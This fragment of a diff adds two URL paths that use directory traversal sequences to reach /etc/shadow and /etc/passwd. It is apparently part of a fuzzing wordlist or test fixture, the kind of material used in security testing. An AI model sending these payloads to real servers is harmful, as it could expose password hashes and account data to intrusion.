@@ -1,0 +1,2 @@
+/help/../../../../../../../../etc/shadow
+/login/../../../etc/passwd
